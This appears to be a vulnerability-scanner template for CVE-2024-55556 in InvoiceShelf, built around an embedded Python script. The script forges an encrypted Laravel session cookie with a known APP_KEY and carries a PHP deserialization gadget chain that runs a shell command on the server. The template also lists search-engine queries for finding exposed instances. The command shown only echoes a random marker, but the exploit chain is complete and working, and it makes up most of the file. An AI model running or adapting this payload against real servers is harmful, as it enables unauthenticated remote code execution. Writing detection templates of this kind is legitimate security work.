code:
- engine:
  - py
  - python3
  source: "import base64\nimport json\nimport hashlib\nimport hmac\nimport os\nimport\
    \ urllib.parse, requests\nfrom Crypto.Cipher import AES\nimport requests,re\n\
    request1=requests.get(os.getenv('RootURL')+'/login')\ncookies=request1.headers['Set-Cookie']\n\
    laravel_session_match = re.search(r\"laravel_session=(.*?);\", cookies)\nlaravel_session_value\
    \ = laravel_session_match.groups()[0]\nrandom_cookie_match = re.search(r\"([A-Za-z0-9+/]{40})=(.*?);\"\
    , cookies)\nrandom_cookie_name, random_cookie_value = random_cookie_match.groups()\n\
    valid_app_key=os.getenv('APP_KEY')\ndef laravel_encrypt_session_cookie(value_to_encrypt,\
    \ hash_value, key, cipher_mode):\n    decoded_value = base64.b64decode(value_to_encrypt).decode('utf-8')\n\
    \    parsed_value = decoded_value.replace('\\\\', '\\\\\\\\').replace('\"', '\\\
    \\\"').replace('\\\\x00','\\\\u0000').replace('\\\\\\\\u0000','\\\\u0000')\n \
    \   session_json_to_encrypt = f\"{hash_value}|{{\\\"data\\\":\\\"{parsed_value}\\\
    \",\\\"expires\\\":9999999999}}\"\n    return laravel_encrypt(base64.b64encode(session_json_to_encrypt.encode()).decode(),\
    \ key, cipher_mode)\n\n\ndef retrieve_key(key):\n    if key.startswith(\"base64:\"\
    ):\n        return base64.b64decode(key.split(\":\")[1])\n    elif len(key) ==\
    \ 44:\n        return base64.b64decode(key)\n    else:\n        return key.encode('utf-8')\n\
    \n\ndef laravel_encrypt(value_to_encrypt, key, cipher_mode):\n    key = retrieve_key(key)\n\
    \    iv = os.urandom(16)  # Generate a random 16-byte IV\n    encrypted_bytes\
    \ = aes_encrypt(base64.b64decode(value_to_encrypt), iv, key, cipher_mode)\n  \
    \  tmp_bytes = base64.b64encode(encrypted_bytes).decode().strip()\n\n    # Base64-encode\
    \ the IV\n    b64_iv = base64.b64encode(iv).decode().strip()\n\n    # Prepare\
    \ data for output\n    data = {\n        \"iv\": b64_iv,\n        \"value\": tmp_bytes,\n\
    \        \"mac\": generate_mac(key, b64_iv, tmp_bytes),\n        \"tag\": \"\"\
    \  # Assuming empty tag\n    }\n\n    # Return the final encrypted value as Base64-encoded\
    \ JSON\n    return base64.b64encode(json.dumps(data).encode()).decode()\n\n\n\
    def aes_encrypt(value, iv, key, cipher_mode):\n    cipher = AES.new(key, AES.MODE_CBC,\
    \ iv)  # Assuming CBC mode\n    pad_length = 16 - (len(value) % 16)\n    padded_value\
    \ = value + bytes([pad_length] * pad_length)\n    return cipher.encrypt(padded_value)\n\
    \n\ndef generate_mac(key, iv, value):\n    return hmac.new(key, f\"{iv}{value}\"\
    .encode(), hashlib.sha256).hexdigest()\n\ndef generate_laravel_payload(pl, pl_len):\n\
    \    laravel_payload = (\n        f'a:2:{{i:7;O:40:\"Illuminate\\\\Broadcasting\\\
    \\PendingBroadcast\":1:{{s:9:\"\\\\x00*\\\\x00events\";'\n        f'O:35:\"Illuminate\\\
    \\Database\\\\DatabaseManager\":2:{{s:6:\"\\\\x00*\\\\x00app\";a:1:{{s:6:\"config\"\
    ;'\n        f'a:2:{{s:16:\"database.default\";s:6:\"system\";s:20:\"database.connections\"\
    ;'\n        f'a:1:{{s:6:\"system\";a:1:{{i:0;s:{pl_len}:\"{pl}\";}}}}}}}}'\n \
    \       f's:13:\"\\\\x00*\\\\x00extensions\";a:1:{{s:6:\"system\";s:12:\"array_filter\"\
    ;}}}}}}i:7;i:7;}}'\n    )\n\n    # Base64 encode the payload\n    b64_laravel_payload\
    \ = base64.b64encode(laravel_payload.encode()).decode()\n\n    return b64_laravel_payload\n\
    \n\ndef laravel_decrypt(laravel_cipher, key, cipher_mode):\n    data = parse_laravel_cipher(laravel_cipher)\n\
    \    key = retrieve_key(key)\n\n    try:\n        return aes_decrypt(data['value'],\
    \ data['iv'], key, cipher_mode)\n    except Exception:\n        print(\"Your key\
    \ is probably malformed or incorrect.\")  # Equivalent to vprint_error\n     \
    \   return None\n\n\ndef parse_laravel_cipher(laravel_cipher):\n    laravel_cipher\
    \ = urllib.parse.unquote(laravel_cipher)  # Decoding URL-encoded string\n\n  \
    \  try:\n        data = json.loads(base64.b64decode(laravel_cipher).decode())\n\
    \    except json.JSONDecodeError:\n        print(\"The JSON inside your base64\
    \ is malformed.\")  # Equivalent to vprint_error\n        return None\n    except\
    \ Exception:\n        print(\"Your base64 laravel_cipher value is malformed.\"\
    )  # Equivalent to vprint_error\n        return None\n\n    try:\n        data['value']\
    \ = base64.b64decode(data['value'])\n        data['iv'] = base64.b64decode(data['iv'])\n\
    \    except Exception:\n        print(\"Error decoding base64 values in the cipher\
    \ data.\")\n        return None\n\n    return data\n\n\ndef aes_decrypt(encrypted_value,\
    \ iv, key, cipher_mode):\n    cipher = AES.new(key, AES.MODE_CBC, iv)  # Assuming\
    \ CBC mode\n    decrypted = cipher.decrypt(encrypted_value)\n\n    # Remove PKCS7\
    \ padding\n    pad_length = decrypted[-1]\n    return decrypted[:-pad_length].decode('utf-8',\
    \ errors='ignore')\nunciphered_value=(laravel_decrypt(urllib.parse.unquote(random_cookie_value),valid_app_key,'AES-256-CBC'))\n\
    \n\n# Example values (Replace these with real values)\npl = \"echo \" + os.getenv('marker_b64')\
    \ + \" | base64 -d\"\npl_len = len(pl)\ncipher_mode = \"CBC\"  # Assuming CBC\
    \ mode\n\n# Generate the Base64 encoded Laravel payload\nb64_laravel_payload=generate_laravel_payload(pl,\
    \ pl_len)\n# Extract the hash value from unciphered_value\nhash_value = unciphered_value.split('|')[0]\n\
    \n# Encrypt the Laravel cookie\nlaravel_cookie_cipher = laravel_encrypt_session_cookie(b64_laravel_payload,\
    \ hash_value, valid_app_key, cipher_mode)\n\nprint(random_cookie_name+'='+laravel_cookie_cipher+';'+'laravel_session='+laravel_session_value.replace('=','%3D'))\n"
flow: 'code();

  http();

  '
http:
- matchers:
  - part: body
    type: word
    words:
    - '{{marker}}'
    - Illuminate/Database/DatabaseManager.php
  - status:
    - 500
    type: status
  matchers-condition: and
  raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    Cookie: {{code_response}}

    '
id: CVE-2024-55556
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-55556
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.99117
    epss-score: 0.8111
  description: 'InvoiceShelf version 1.3.0 and below contains an unauthenticated PHP
    deserialization vulnerability that can lead to remote code execution. An attacker
    with knowledge of the APP_KEY can achieve remote command execution on the server
    through Laravel''s cookie deserialization. While the vulnerability is severe,
    it is partially mitigated in default installations as the APP_KEY is regenerated
    during setup.

    '
  impact: 'Unauthenticated attackers with knowledge of the APP_KEY can achieve remote
    code execution through Laravel cookie deserialization on InvoiceShelf servers.

    '
  metadata:
    fofa-query: title="InvoiceShelf"
    max-request: 2
    shodan-query: http.title:"InvoiceShelf"
    verified: true
  name: InvoiceShelf <= 1.3.0 - PHP Deserialization
  reference:
  - https://www.synacktiv.com/en/advisories/crater-invoice-unauthenticated-remote-command-execution-when-appkey-known
  - https://github.com/rapid7/metasploit-framework/pull/19950
  - https://nvd.nist.gov/vuln/detail/CVE-2024-55556
  remediation: 'Upgrade InvoiceShelf to a version higher than 1.3.0. Ensure your APP_KEY
    is properly regenerated and not using the default value

    '
  severity: critical
  tags: cve,cve2024,invoiceshelf,rce,deserialization,vuln
variables:
  APP_KEY: base64:kgk/4DW1vEVy7aEvet5FPp5un6PIGe/so8H0mvoUtW0=
  marker: '{{randstr}}'
  marker_b64: '{{base64(marker)}}'
